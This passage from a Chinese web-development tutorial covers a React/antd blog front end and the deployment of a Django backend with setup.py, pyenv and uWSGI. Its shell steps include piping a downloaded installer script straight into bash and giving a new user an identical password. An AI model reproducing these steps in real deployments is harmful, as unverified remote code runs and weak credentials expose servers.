                message.info(<span style="color: #8b2252;">'&#21338;&#25991;&#25552;&#20132;&#25104;&#21151;'</span>);
                <span style="color: #b22222;">// </span><span style="color: #b22222;">&#22686;&#24378;&#65292;&#30830;&#35748;&#26159;&#21542;&#36339;&#36716;</span>
                <span style="color: #008b8b;">this</span>.success = <span style="color: #008b8b;">true</span>;
            },
            reason =&gt; {
                console.log(reason);
                message.warning(reason.msg || <span style="color: #8b2252;">'&#38169;&#35823;&#65292;&#35831;&#32852;&#31995;&#31649;&#29702;&#21592;'</span>);
            }
        );
    }

    getToken() {
        axios.get({
            url:<span style="color: #8b2252;">'/gettoken'</span>,
        }).then(
            value =&gt; {
                console.log(<span style="color: #8b2252;">'&#25104;&#21151;&#33719;&#21462;token'</span>, Cookies.get(<span style="color: #8b2252;">'csrftoken'</span>))
            },
            reason =&gt; {
                console.log(reason);
                message.warning(reason.msg || <span style="color: #8b2252;">'&#38169;&#35823;&#65292;&#35831;&#32852;&#31995;&#31649;&#29702;&#21592;'</span>);
            }
        );
    }
    getPost(id) {
        axios.get({url:<span style="color: #8b2252;">'/posts/'</span>+id}).then(
            value =&gt; {
                console.log(<span style="color: #8b2252;">'&#25104;&#21151;&#20102;'</span>, value);
                <span style="color: #008b8b;">this</span>.post = value.post || {} ;
            },
            reason =&gt; {
                console.log(reason);
                message.warning(reason.msg || <span style="color: #8b2252;">'&#38169;&#35823;&#65292;&#35831;&#32852;&#31995;&#31649;&#29702;&#21592;'</span>);
            }
        );
    }

    list(params) { <span style="color: #b22222;">// </span><span style="color: #b22222;">&#26080;&#26684;&#24335;&#23545;&#35937;(plain object) &#25110;URLSearchParmas&#23545;&#35937;</span>
        axios.get({
            url:<span style="color: #8b2252;">'/posts/'</span>,
            config:{
                <span style="color: #8b2252;">'params'</span>:params
            }
        }).then(
            value =&gt; {
                console.log(<span style="color: #8b2252;">'&#25104;&#21151;&#20102;'</span>, value);
                <span style="color: #008b8b;">this</span>.posts = value || {} ;
            },
            reason =&gt; {
                console.log(reason);
                message.warning(reason.msg || <span style="color: #8b2252;">'&#38169;&#35823;&#65292;&#35831;&#32852;&#31995;&#31649;&#29702;&#21592;'</span>);
            }
        );
    }
}

<span style="color: #a020f0;">const</span> <span style="color: #a0522d;">postService</span> = <span style="color: #a020f0;">new</span> <span style="color: #228b22;">PostService</span>();
<span style="color: #a020f0;">export</span> {postService}
</pre>
</div>

<p>
但是鼠标左右两端发现上一页、下一页是英文，如何修改？国际化。
</p>
</div>
</div>
</div>
<div id="outline-container-h:84c66087-1fe7-4aaf-aff7-74f3395bd685" class="outline-3">
<h3 id="h:84c66087-1fe7-4aaf-aff7-74f3395bd685">国际化</h3>
<div class="outline-text-3" id="text-h:84c66087-1fe7-4aaf-aff7-74f3395bd685">
<ul class="org-ul">
<li>ConfigProvider全局化配置: <a href="https://ant.design/components/config-provider-cn">https://ant.design/components/config-provider-cn</a></li>
</ul>

<p>
index.js修改如下(部分代码)
</p>

<div class="org-src-container">
<pre class="src src-js"><span style="color: #a020f0;">import</span> { Menu, Icon, Layout, ConfigProvider } from <span style="color: #8b2252;">'antd'</span>;
<span style="color: #a020f0;">import</span> zhCN from <span style="color: #8b2252;">'antd/es/locale/zh_CN'</span>;

ReactDom.render(&lt;ConfigProvider locale={zhCN}&gt;
  &lt;App /&gt;&lt;/ConfigProvider&gt;, document.getElementById(<span style="color: #8b2252;">'root'</span>));
</pre>
</div>

<div class="org-src-container">
<pre class="src src-js"><span style="color: #b22222;">/*</span><span style="color: #b22222;">src/index.js</span><span style="color: #b22222;">*/</span>
<span style="color: #a020f0;">import</span> React from <span style="color: #8b2252;">'react'</span>;
<span style="color: #a020f0;">import</span> { render } from <span style="color: #8b2252;">'react-dom'</span>;
<span style="color: #a020f0;">import</span> { BrowserRouter as Router, Switch, Route, Link } from <span style="color: #8b2252;">"react-router-dom"</span>;
<span style="color: #a020f0;">import</span> Login from <span style="color: #8b2252;">'./component/login'</span>;
<span style="color: #a020f0;">import</span> Reg from <span style="color: #8b2252;">'./component/reg'</span>;
<span style="color: #a020f0;">import</span> Pub from <span style="color: #8b2252;">'./component/pub'</span>;
<span style="color: #a020f0;">import</span> Profile from <span style="color: #8b2252;">'./component/profile'</span>;
<span style="color: #a020f0;">import</span> Detail from <span style="color: #8b2252;">'./component/detail'</span>;
<span style="color: #a020f0;">import</span> List from <span style="color: #8b2252;">'./component/list'</span>;

<span style="color: #a020f0;">import</span> { Menu, Icon, Layout, ConfigProvider } from <span style="color: #8b2252;">'antd'</span>;
<span style="color: #a020f0;">const</span> { Header, Content, Footer } = Layout;
<span style="color: #a020f0;">import</span> zhCN from <span style="color: #8b2252;">'antd/es/locale/zh_CN'</span>;

<span style="color: #a020f0;">const</span> <span style="color: #a0522d;">Home</span> = props =&gt; &lt;<span style="color: #0000ff;">h2</span>&gt;<span style="color: #000000; background-color: #ffffff;">Home</span>&lt;/<span style="color: #0000ff;">h2</span>&gt;;
<span style="color: #a020f0;">const</span> <span style="color: #a0522d;">About</span> = props =&gt; &lt;<span style="color: #0000ff;">h2</span>&gt;<span style="color: #000000; background-color: #ffffff;">About</span>&lt;/<span style="color: #0000ff;">h2</span>&gt;;
<span style="color: #a020f0;">const</span> <span style="color: #a0522d;">Default</span> = props =&gt; &lt;<span style="color: #0000ff;">h2</span>&gt;<span style="color: #000000; background-color: #ffffff;">&#32570;&#30465;&#26174;&#31034;</span>&lt;/<span style="color: #0000ff;">h2</span>&gt;;
<span style="color: #a020f0;">const</span> <span style="color: #a0522d;">Always</span> = props =&gt; &lt;<span style="color: #0000ff;">h2</span>&gt;<span style="color: #000000; background-color: #ffffff;">blog &#169;2008 Created by Jasper</span>&lt;/<span style="color: #0000ff;">h2</span>&gt;;

<span style="color: #a020f0;">class</span> App <span style="color: #a020f0;">extends</span> React.Component {
  state = {
    current: <span style="color: #8b2252;">'home'</span>,
  };

  handleClick = e =&gt; {
    console.log(<span style="color: #8b2252;">'click '</span>, e);
    <span style="color: #008b8b;">this</span>.setState({
      current: e.key,
    });
  };
  render() {
    <span style="color: #a020f0;">return</span> &lt;<span style="color: #0000ff;">Router</span>&gt;
<span style="color: #000000; background-color: #ffffff;">      </span>&lt;<span style="color: #0000ff;">Layout</span> <span style="color: #a0522d;">className</span>=<span style="color: #8b2252;">"layout"</span>&gt;
<span style="color: #000000; background-color: #ffffff;">        </span>&lt;<span style="color: #0000ff;">Header</span>&gt;
<span style="color: #000000; background-color: #ffffff;">          </span>&lt;<span style="color: #0000ff;">Menu</span> <span style="color: #a0522d;">onClick</span>={<span style="color: #008b8b;">this</span>.handleClick}
            <span style="color: #a0522d;">theme</span>=<span style="color: #8b2252;">"dark"</span>
            <span style="color: #a0522d;">mode</span>=<span style="color: #8b2252;">"horizontal"</span>
            <span style="color: #a0522d;">defaultSelectedKeys</span>={[<span style="color: #008b8b;">this</span>.state.current]}
            <span style="color: #a0522d;">style</span>={{ lineHeight: <span style="color: #8b2252;">'64px'</span> }}
          <span style="color: #b22222;">// </span><span style="color: #a0522d;">selectedKeys</span><span style="color: #b22222;">={[this.state.current]}</span>
          &gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;<span style="color: #0000ff;">Menu.Item</span> <span style="color: #a0522d;">key</span>=<span style="color: #8b2252;">"home"</span>&gt;&lt;<span style="color: #0000ff;">Link</span> <span style="color: #a0522d;">to</span>=<span style="color: #8b2252;">"/"</span>&gt;&lt;<span style="color: #0000ff;">Icon</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"home"</span> /&gt;<span style="color: #000000; background-color: #ffffff;">&#20027;&#39029;</span>&lt;/<span style="color: #0000ff;">Link</span>&gt;&lt;/<span style="color: #0000ff;">Menu.Item</span>&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;<span style="color: #0000ff;">Menu.Item</span> <span style="color: #a0522d;">key</span>=<span style="color: #8b2252;">"login"</span>&gt;&lt;<span style="color: #0000ff;">Link</span> <span style="color: #a0522d;">to</span>=<span style="color: #8b2252;">"/login"</span>&gt;&lt;<span style="color: #0000ff;">Icon</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"login"</span> /&gt;<span style="color: #000000; background-color: #ffffff;">&#30331;&#24405;</span>&lt;/<span style="color: #0000ff;">Link</span>&gt;&lt;/<span style="color: #0000ff;">Menu.Item</span>&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;<span style="color: #0000ff;">Menu.Item</span> <span style="color: #a0522d;">key</span>=<span style="color: #8b2252;">"reg"</span>&gt;&lt;<span style="color: #0000ff;">Link</span> <span style="color: #a0522d;">to</span>=<span style="color: #8b2252;">"/reg"</span>&gt;&lt;<span style="color: #0000ff;">Icon</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"form"</span> /&gt;<span style="color: #000000; background-color: #ffffff;">&#27880;&#20876;</span>&lt;/<span style="color: #0000ff;">Link</span>&gt;&lt;/<span style="color: #0000ff;">Menu.Item</span>&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;<span style="color: #0000ff;">Menu.Item</span> <span style="color: #a0522d;">key</span>=<span style="color: #8b2252;">"pub"</span>&gt;&lt;<span style="color: #0000ff;">Link</span> <span style="color: #a0522d;">to</span>=<span style="color: #8b2252;">"/pub"</span>&gt;&lt;<span style="color: #0000ff;">Icon</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"edit"</span> /&gt;<span style="color: #000000; background-color: #ffffff;">&#20889;&#21338;&#23458;</span>&lt;/<span style="color: #0000ff;">Link</span>&gt;&lt;/<span style="color: #0000ff;">Menu.Item</span>&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;<span style="color: #0000ff;">Menu.Item</span> <span style="color: #a0522d;">key</span>=<span style="color: #8b2252;">"list"</span>&gt;&lt;<span style="color: #0000ff;">Link</span> <span style="color: #a0522d;">to</span>=<span style="color: #8b2252;">"/list"</span>&gt;&lt;<span style="color: #0000ff;">Icon</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"bars"</span> /&gt;<span style="color: #000000; background-color: #ffffff;">&#21338;&#23458;</span>&lt;/<span style="color: #0000ff;">Link</span>&gt;&lt;/<span style="color: #0000ff;">Menu.Item</span>&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;<span style="color: #0000ff;">Menu.Item</span> <span style="color: #a0522d;">key</span>=<span style="color: #8b2252;">"about"</span>&gt;&lt;<span style="color: #0000ff;">Link</span> <span style="color: #a0522d;">to</span>=<span style="color: #8b2252;">"/about"</span>&gt;<span style="color: #000000; background-color: #ffffff;">&#20851;&#20110;</span>&lt;/<span style="color: #0000ff;">Link</span>&gt;&lt;/<span style="color: #0000ff;">Menu.Item</span>&gt;
<span style="color: #000000; background-color: #ffffff;">          </span>&lt;/<span style="color: #0000ff;">Menu</span>&gt;
<span style="color: #000000; background-color: #ffffff;">        </span>&lt;/<span style="color: #0000ff;">Header</span>&gt;
<span style="color: #000000; background-color: #ffffff;">        </span>&lt;<span style="color: #0000ff;">Content</span> <span style="color: #a0522d;">style</span>={{ padding: <span style="color: #8b2252;">'10px 50px'</span> }}&gt;
<span style="color: #000000; background-color: #ffffff;">          </span>&lt;<span style="color: #0000ff;">div</span> <span style="color: #a0522d;">style</span>={{ background: <span style="color: #8b2252;">'#fff'</span>, padding: 24, minHeight: 280 }}&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;<span style="color: #0000ff;">Switch</span>&gt;
<span style="color: #000000; background-color: #ffffff;">              </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">exact</span> <span style="color: #a0522d;">path</span>={[<span style="color: #8b2252;">"/"</span>, <span style="color: #8b2252;">'/index'</span>]} <span style="color: #a0522d;">component</span>={Home}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">              </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">path</span>=<span style="color: #8b2252;">"/login"</span> <span style="color: #a0522d;">component</span>={Login}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">              </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">path</span>=<span style="color: #8b2252;">"/reg"</span> <span style="color: #a0522d;">component</span>={Reg}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">              </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">path</span>=<span style="color: #8b2252;">"/about"</span> <span style="color: #a0522d;">component</span>={About}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">              </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">path</span>=<span style="color: #8b2252;">"/profile"</span> <span style="color: #a0522d;">component</span>={Profile}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">              </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">path</span>=<span style="color: #8b2252;">"/pub"</span> <span style="color: #a0522d;">component</span>={Pub}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">              </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">path</span>=<span style="color: #8b2252;">"/list"</span> <span style="color: #a0522d;">component</span>={List}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">              </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">path</span>=<span style="color: #8b2252;">"/posts/:id"</span> <span style="color: #a0522d;">component</span>={Detail}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">              </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">component</span>={Default}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;/<span style="color: #0000ff;">Switch</span>&gt;
<span style="color: #000000; background-color: #ffffff;">          </span>&lt;/<span style="color: #0000ff;">div</span>&gt;
<span style="color: #000000; background-color: #ffffff;">        </span>&lt;/<span style="color: #0000ff;">Content</span>&gt;
<span style="color: #000000; background-color: #ffffff;">        </span>&lt;<span style="color: #0000ff;">Footer</span> <span style="color: #a0522d;">style</span>={{ textAlign: <span style="color: #8b2252;">'center'</span> }}&gt;
<span style="color: #000000; background-color: #ffffff;">          </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">component</span>={Always}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">        </span>&lt;/<span style="color: #0000ff;">Footer</span>&gt;
<span style="color: #000000; background-color: #ffffff;">      </span>&lt;/<span style="color: #0000ff;">Layout</span>&gt;
<span style="color: #000000; background-color: #ffffff;">    </span>&lt;/<span style="color: #0000ff;">Router</span>&gt;
  }
}
render(&lt;<span style="color: #0000ff;">ConfigProvider</span> <span style="color: #a0522d;">locale</span>={zhCN}&gt;
<span style="color: #000000; background-color: #ffffff;">  </span>&lt;<span style="color: #0000ff;">App</span> /&gt;&lt;/<span style="color: #0000ff;">ConfigProvider</span>&gt;, document.getElementById(<span style="color: #8b2252;">'root'</span>));
</pre>
</div>
</div>
</div>
<div id="outline-container-h:fa799f56-d419-4805-ba91-300d659144fb" class="outline-3">
<h3 id="h:fa799f56-d419-4805-ba91-300d659144fb">重构Axios</h3>
<div class="outline-text-3" id="text-h:fa799f56-d419-4805-ba91-300d659144fb">
<p>
src/axios/index.js 合并get, post方法
</p>
<div class="org-src-container">
<pre class="src src-js"><span style="color: #b22222;">/*</span><span style="color: #b22222;">src/axios/index.js</span><span style="color: #b22222;">*/</span>
<span style="color: #a020f0;">import</span> axios from <span style="color: #8b2252;">'axios'</span>;

<span style="color: #b22222;">// </span><span style="color: #b22222;">axios.post axios.get proxy:/api/users/login -&gt; rewrite http://localhost:8000/users/login</span>
<span style="color: #b22222;">// </span><span style="color: #b22222;">baseURL:/api</span>
<span style="color: #a020f0;">export</span> <span style="color: #a020f0;">default</span> <span style="color: #a020f0;">class</span> Axios {
    <span style="color: #a020f0;">static</span> config = {
        baseURL: <span style="color: #8b2252;">'/api'</span>,
        timeout: 3000,
    }

    <span style="color: #a020f0;">static</span> post(params) { <span style="color: #b22222;">// </span><span style="color: #b22222;">{url:xxx, data:{}, config:{yyy:zzz}}</span>
        <span style="color: #a020f0;">return</span> <span style="color: #008b8b;">this</span>.request(params, <span style="color: #8b2252;">'post'</span>);
    }
    <span style="color: #a020f0;">static</span> get(params) { <span style="color: #b22222;">// </span><span style="color: #b22222;">{url:xxx, params:{}, config:{yyy:zzz}}</span>
        <span style="color: #a020f0;">return</span> <span style="color: #008b8b;">this</span>.request(params, <span style="color: #8b2252;">'get'</span>);
    }
    <span style="color: #a020f0;">static</span> request(params, method = <span style="color: #8b2252;">'get'</span>) {
        <span style="color: #a020f0;">let</span> <span style="color: #a0522d;">config</span> = {
            method, url: params.url
        };
        <span style="color: #a020f0;">if</span> (method === <span style="color: #8b2252;">'get'</span>) {
            config.params = params.params;
        }
        <span style="color: #a020f0;">if</span> (method === <span style="color: #8b2252;">'post'</span> &amp;&amp; params.data) {
            config.data = params.data;
        }

        config = Object.assign({}, <span style="color: #008b8b;">this</span>.config, config, params.config)
        <span style="color: #a020f0;">return</span> axios(config).then( <span style="color: #b22222;">// </span><span style="color: #b22222;">&#36820;&#22238;&#19968;&#20010;&#20840;&#26032;&#30340;Promise&#23545;&#35937;</span>
            response =&gt; { <span style="color: #b22222;">// </span><span style="color: #b22222;">200. &#19968;&#23450;&#35201;&#29992;&#31661;&#22836;&#20989;&#25968;&#65292;&#21542;&#21017;this&#26377;&#38382;&#39064;</span>
                <span style="color: #a020f0;">const</span> <span style="color: #a0522d;">data</span> = response.data;
                <span style="color: #a020f0;">if</span> (!data.code) {
                    <span style="color: #b22222;">// </span><span style="color: #b22222;">sucess</span>
                    <span style="color: #a020f0;">return</span> data;  <span style="color: #b22222;">// </span><span style="color: #b22222;">&#30456;&#24403;&#20110; return Promise.resolve(data);</span>
                } <span style="color: #a020f0;">else</span> {
                    <span style="color: #b22222;">// </span><span style="color: #b22222;">failed</span>
                    <span style="color: #a020f0;">return</span> Promise.reject(data); <span style="color: #b22222;">// </span><span style="color: #b22222;">{code:1, msg:xxx}</span>
                }
            }
        ).<span style="color: #a020f0;">catch</span>( <span style="color: #b22222;">// </span><span style="color: #b22222;">&#22833;&#36133;&#32473;&#20986;&#22833;&#36133;&#30340;&#29702;&#30001;</span>
            reason =&gt; {
                <span style="color: #a020f0;">return</span> Promise.reject(reason); <span style="color: #b22222;">// </span><span style="color: #b22222;">&#33258;&#24049;&#35843;&#29992;</span>
                <span style="color: #b22222;">// </span><span style="color: #b22222;">return Promise.reject('&#35831;&#27714;&#38169;&#35823;');</span>
            }
        )
    }
}
</pre>
</div>
</div>
</div>
</section>
<section id="outline-container-h:d3614d6d-3876-4326-9ace-cd20f9df9d70" class="outline-2">
<h2 id="h:d3614d6d-3876-4326-9ace-cd20f9df9d70">项目部署</h2>
<div class="outline-text-2" id="text-h:d3614d6d-3876-4326-9ace-cd20f9df9d70">
</div>
<div id="outline-container-h:77405a37-bdc1-4f4b-8d4d-b186fea9a7d0" class="outline-3">
<h3 id="h:77405a37-bdc1-4f4b-8d4d-b186fea9a7d0">Django 打包</h3>
<div class="outline-text-3" id="text-h:77405a37-bdc1-4f4b-8d4d-b186fea9a7d0">
</div>
<div id="outline-container-h:6c693d37-8ace-4f7a-9311-f48318650ed9" class="outline-4">
<h4 id="h:6c693d37-8ace-4f7a-9311-f48318650ed9">构建setup.py文件</h4>
<div class="outline-text-4" id="text-h:6c693d37-8ace-4f7a-9311-f48318650ed9">
<p>
<a href="https://packaging.python.org/tutorials/packaging-projects/#creating-setup-py">https://packaging.python.org/tutorials/packaging-projects/#creating-setup-py</a>
</p>

<p>
<a href="https://packaging.python.org/en/latest/guides/distributing-packages-using-setuptools/#setup-args">https://packaging.python.org/en/latest/guides/distributing-packages-using-setuptools/#setup-args</a>
</p>

<p>
<a href="https://setuptools.pypa.io/en/latest/references/keywords.html">https://setuptools.pypa.io/en/latest/references/keywords.html</a>
</p>

<p>
生成项目依赖插件版本信息
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#24212;&#29992;&#31243;&#24207;&#30340;&#26681;&#30446;&#24405;&#19979;&#29983;&#25104;</span>
pip freeze &gt;requirements
</pre>
</div>

<p>
在使用 setup.py 之前，需要确保已经安装了 setuptools 模块。
</p>
<div class="org-src-container">
<pre class="src src-sh">pip install setuptools
</pre>
</div>

<p>
构建setup.py文件(在应用程序根目录下面)
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">import</span> setuptools
<span style="color: #a020f0;">import</span> glob

<span style="color: #b22222;"># </span><span style="color: #b22222;">print(setuptools.find_packages()) #['blog', 'post', 'user', 'post.migrations', 'user.migrations', 'user.templatetags']</span>

<span style="color: #b22222;"># </span><span style="color: #b22222;">print(glob.glob('templates/*.html')) #['templates\\index.html']</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">print(glob.glob('user/templates/*.html')) </span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">print(glob.glob('**/*.html', recursive=True))</span>

setuptools.setup(
    name=<span style="color: #8b2252;">"blog"</span>,
    version=<span style="color: #8b2252;">"1.0.1"</span>,
    description=<span style="color: #8b2252;">"blog project"</span>,
    author=<span style="color: #8b2252;">"abc"</span>,
    author_email=<span style="color: #8b2252;">"abc@123.com"</span>,
    url=<span style="color: #8b2252;">"https://xuchangwei.com"</span>,
    <span style="color: #b22222;"># </span><span style="color: #b22222;">packages=['post', 'user', 'blog', 'user.templatetags'],</span>
    packages=setuptools.find_packages(),
    py_modules=[<span style="color: #8b2252;">"messages"</span>, <span style="color: #8b2252;">"manage"</span>], <span style="color: #b22222;"># </span><span style="color: #b22222;">&#21333;&#29420;.py&#25991;&#20214;&#25171;&#21253;&#65292;&#22635;&#20889;&#26102;&#21435;&#25481;.py</span>
    data_files=glob.glob(<span style="color: #8b2252;">'**/*.html'</span>, recursive=<span style="color: #008b8b;">True</span>) + [<span style="color: #8b2252;">'requirements'</span>],
    python_requires=<span style="color: #8b2252;">'&gt;=3.6'</span>,
)
</pre>
</div>

<p>
应用程序的跟目录下打包
</p>
<div class="org-src-container">
<pre class="src src-sh">python setup.py sdist
<span style="color: #b22222;">#</span><span style="color: #b22222;">python setup.py sdist --formats=gztar #gz  &#40664;&#35748;tar.gz&#26684;&#24335;</span>
</pre>
</div>
</div>
</div>
<div id="outline-container-h:eee04224-b96e-4a29-830e-f70066ce05a1" class="outline-4">
<h4 id="h:eee04224-b96e-4a29-830e-f70066ce05a1">部署应用</h4>
<div class="outline-text-4" id="text-h:eee04224-b96e-4a29-830e-f70066ce05a1">
<p>
在Linux系统中创建一个python虚拟环境目录，使用pyenv
</p>

<p>
安装pyenv
</p>

<div class="org-src-container">
<pre class="src src-sh">yum install git python-devel mysql-devel 
yum -y install gcc make patch gdbm-devel openssl-devel sqlite-devel readline-devel zlib-devel bzip2-devel

<span style="color: #b22222;">#</span><span style="color: #b22222;">python&#20381;&#36182;&#65292;mysqlclient&#20381;&#36182;</span>
yum install python-devel mysql-devel

useradd python
<span style="color: #483d8b;">echo</span> python | passwd python --stdin
su - python

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#36827;&#20837;python&#29992;&#25143;&#25191;&#34892;&#22914;&#19979;&#25805;&#20316;</span>
curl -L https://github.com/pyenv/pyenv-installer/raw/master/bin/pyenv-installer | bash
cat &lt;&lt;\EOF&gt;&gt; ~/.bashrc
<span style="color: #ffa54f;">#command -v pyenv &gt;/dev/null || export PATH="$PYENV_ROOT/bin:$PATH"</span>

<span style="color: #ffa54f;">#add pyenv</span>
<span style="color: #ffa54f;">export PYENV_ROOT="$HOME/.pyenv"</span>
<span style="color: #ffa54f;">[[ -d $PYENV_ROOT/bin ]] &amp;&amp; export PATH="$PYENV_ROOT/bin:$PATH"</span>
<span style="color: #ffa54f;">eval "$(</span><span style="color: #ff00ff;">pyenv init - bash</span><span style="color: #ffa54f;">)"</span>
<span style="color: #ffa54f;">eval "$(</span><span style="color: #ff00ff;">pyenv virtualenv-init -</span><span style="color: #ffa54f;">)"</span>
<span style="color: #ffa54f;">EOF</span>

<span style="color: #483d8b;">source</span> ~/.bashrc

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#20197;&#21518;&#26356;&#26032;pyenv&#20351;&#29992;</span>
pyenv update

pyenv install 3.6.6 -vv
</pre>
</div>

<p>
准备pip配置文件
</p>
<div class="org-src-container">
<pre class="src src-sh">mkdir ~/.pip
$ vim ~/.pip/pip.conf
[global]
index-url = https://mirrors.aliyun.com/pypi/simple/

[install]
trusted-host=mirrors.aliyun.com
</pre>
</div>

<p>
安装虚拟环境, 并应用打包文件
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#21019;&#24314;&#34394;&#25311;&#29615;&#22659;</span>
pyenv virtualenv 3.6.6 blog366

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#21019;&#24314;&#39033;&#30446;&#30446;&#24405;</span>
mkdir -p projects
<span style="color: #483d8b;">cd</span> projects 
tar xf blog-1.0.tar.gz
$ ln -sv blog-1.0 web
<span style="color: #8b2252;">"web"</span> -&gt; <span style="color: #8b2252;">"blog-1.0"</span>
<span style="color: #483d8b;">cd</span> web
$ pwd
/home/python/projects/web

<span style="color: #b22222;">#</span><span style="color: #b22222;">local &#26412;&#22320;&#35774;&#32622;</span>
pyenv local blog366

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#23433;&#35013;mysql&#21069;&#19968;&#23450;&#35201;yum&#23433;&#35013;&#19979;&#38754;&#30340;&#20381;&#36182;</span>
sudo yum install git python-devel mysql-devel 

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#23433;&#35013;&#20381;&#36182;&#24211;</span>
pip list
pip install -r requirements  <span style="color: #b22222;">#</span><span style="color: #b22222;">&#23433;&#35013;&#20381;&#36182;&#21253;</span>
sed -i -e <span style="color: #8b2252;">'s/DEBUG.*/DEBUG = False/'</span> -e <span style="color: #8b2252;">'s/ALLOWED_HOSTS.*/ALLOWED_HOSTS = ["*"]/'</span> blog/setting.py <span style="color: #b22222;"># </span><span style="color: #b22222;">&#20462;&#25913;Django&#37197;&#32622;</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">settings.py&#20462;&#25913;&#25968;&#25454;&#36830;&#25509;&#20449;&#24687;</span>

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#21551;&#21160;&#24212;&#29992;&#65292;&#29992;&#20110;&#27979;&#35797;&#65292;&#39564;&#35777;&#27491;&#24120;&#21518;&#21487;&#20197;&#20572;&#20102;</span>
python manage.py runserver 0.0.0.0:9112 <span style="color: #b22222;"># </span><span style="color: #b22222;">&#27979;&#35797;.</span>
</pre>
</div>

<p>
访问 <a href="http://ip:9112/posts/?page=2&amp;size=2">http://ip:9112/posts/?page=2&amp;size=2</a> 成功返回数据，说明Django应用成功。
</p>

<p>
至此，Django应用部署完成。Django带了个开发用Web Server。生成环境不用，需要借助其他Server。
</p>

<p>
注意：ALLOWED_HOSTS=[“*”] 这是所有都可以访问，生产环境应指定具体可以访问的IP，而不是所有。
</p>
</div>
</div>
</div>
<div id="outline-container-h:ae32511d-2909-4b0e-bcf9-b001c184edc2" class="outline-3">
<h3 id="h:ae32511d-2909-4b0e-bcf9-b001c184edc2">WSGI</h3>
<div class="outline-text-3" id="text-h:ae32511d-2909-4b0e-bcf9-b001c184edc2">
<p>
Web Server Gateway Interface，是Python中定义的WSGI Server与应用程序的接口定义。
</p>

<p>
应用程序符合WSGI规范的Django框架负责，WSGI Server谁来做？
</p>
</div>
</div>
<div id="outline-container-h:e71c9208-5f11-4cdc-8f4d-518b32b89655" class="outline-3">
<h3 id="h:e71c9208-5f11-4cdc-8f4d-518b32b89655">uWSGI</h3>
<div class="outline-text-3" id="text-h:e71c9208-5f11-4cdc-8f4d-518b32b89655">
<p>
uWSGI是一个c语言的项目，提供一个WEB服务器，它支持WSGI协议，可以和Python的WGSI应用程序通信。
</p>

<p>
官方文档<a href="https://uwsgi-docs.readthedocs.io/en/latest/">https://uwsgi-docs.readthedocs.io/en/latest/</a>
</p>

<p>
uWSGI可以直接启动HTTP服务，接收HTTP请求，并调用Django应用。
</p>

<p>
安装
</p>

<div class="org-src-container">
<pre class="src src-sh">pip install uwsgi
uwsgi --help
</pre>
</div>
</div>
</div>
<div id="outline-container-h:531e8839-c96e-489f-a66b-f53626a25a85" class="outline-3">
<h3 id="h:531e8839-c96e-489f-a66b-f53626a25a85">uWSGI+Django部署</h3>
<div class="outline-text-3" id="text-h:531e8839-c96e-489f-a66b-f53626a25a85">
<p>
在Django项目根目录下，运行
</p>
<div class="org-src-container">
<pre class="src src-sh">uwsgi --http :8000 --wsgi-file blog/wsgi.py --stats :8001 --stats-http

<span style="color: #b22222;"># </span><span style="color: #b22222;">--http :8000 &#26381;&#21153;&#30417;&#21548;&#31471;&#21475;</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">--stats :8001 &#30417;&#25511;&#26381;&#21153;&#29366;&#24577;</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">--stats-http  &#21487;&#20197;&#36890;&#29992;&#27983;&#35272;&#22120;&#35775;&#38382;&#26381;&#21153;&#29366;&#24577;</span>
</pre>
</div>

<p>
使用下面链接测试
</p>
